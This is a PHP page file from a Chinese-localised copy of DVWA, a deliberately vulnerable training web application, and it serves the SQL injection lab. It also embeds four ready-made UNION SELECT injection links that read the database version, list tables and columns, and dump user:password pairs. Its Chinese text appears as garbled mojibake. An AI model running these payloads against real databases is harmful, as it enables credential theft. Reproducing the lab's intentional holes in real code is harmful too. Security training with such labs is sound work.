<?php

define( 'DVWA_WEB_PAGE_TO_ROOT', '../../' );
require_once DVWA_WEB_PAGE_TO_ROOT.'dvwa/includes/dvwaPage.inc.php';

dvwaPageStartup( array( 'authenticated', 'phpids' ) );

$page = dvwaPageNewGrab();
$page[ 'title' ] .= $page[ 'title_separator' ].'©��: SQL ע��';
$page[ 'page_id' ] = 'sqli';

dvwaDatabaseConnect();

$vulnerabilityFile = '';
switch( $_COOKIE[ 'security' ] ) {
	case 'low':
		$vulnerabilityFile = 'low.php';
		break;

	case 'medium':
		$vulnerabilityFile = 'medium.php';
		break;

	case 'high':
	default:
		$vulnerabilityFile = 'high.php';
		break;
}

require_once DVWA_WEB_PAGE_TO_ROOT."vulnerabilities/sqli/source/{$vulnerabilityFile}";

$page[ 'help_button' ] = 'sqli';
$page[ 'source_button' ] = 'sqli';

$magicQuotesWarningHtml = '';

// Check if Magic Quotes are on or off
if( ini_get( 'magic_quotes_gpc' ) == true ) {
	$magicQuotesWarningHtml = "	<div class=\"warning\">Magic Quotes ���ڿ���״̬, �������ܽ���SQLע�룬��رա�</div>";
}

$page[ 'body' ] .= "
<div class=\"body_padded\">
	<h1>©��: SQL ע��</h1>

	{$magicQuotesWarningHtml}

	<div class=\"vulnerable_code_area\">

		<h3>�û�ID:</h3>

		<form action=\"#\" method=\"GET\">
			<input type=\"text\" name=\"id\">
			<input type=\"submit\" name=\"Submit\" value=\"ȷ��\">
		</form>

		{$html}

	</div>
    <h3><font color=\"red\">���Է�����</font></h3>
    <div class=\"vulnerable_code_area\"><br />
    <a href=\"".dvwaGetCurrentUrl()."?id=-1' UNION SELECT 1,CONCAT_WS(CHAR(32,58,32),user(),database(),version()) %23&Submit=%C8%B7%B6%A8\"><font color=\"blue\">�����ȡ���ݿ������Ϣ</font></a><br /><br />
    <a href=\"".dvwaGetCurrentUrl()."?id=-1' UNION SELECT 1,concat(table_name) from information_schema.tables where table_schema=database() %23&Submit=%C8%B7%B6%A8\"><font color=\"blue\">�����ȡ���ݿ����б�</font></a><br /><br />
    <a href=\"".dvwaGetCurrentUrl()."?id=-1' UNION SELECT 1,concat(column_name) from information_schema.columns where table_name=0x7573657273 %23&Submit=%C8%B7%B6%A8\"><font color=\"blue\">�����ȡusers����ֶ�</font></a><br /><br />
    <a href=\"".dvwaGetCurrentUrl()."?id=-1' UNION SELECT 1,concat(user,0x3a,password) from users %23&Submit=%C8%B7%B6%A8\"><font color=\"blue\">�����ȡusers�������</font></a><br /><br /><br />
    <h3><font color=\"red\">���������뿴��</font><a href=\"http://www.waitalone.cn/post/Mysql_Injection.html\" target=\"_blank\">mysqlע���ܽ�</a></h3>
    </div>
	<h2>������Ϣ</h2>
	<ul>
		<li>".dvwaExternalLinkUrlGet( 'http://www.securiteam.com/securityreviews/5DP0N1P76E.html')."</li>
		<li>".dvwaExternalLinkUrlGet( 'http://en.wikipedia.org/wiki/SQL_injection')."</li>
		<li>".dvwaExternalLinkUrlGet( 'http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/')."</li>
		<li>".dvwaExternalLinkUrlGet( 'http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet')."</li>
	</ul>
</div>
";

dvwaHtmlEcho( $page );

?>
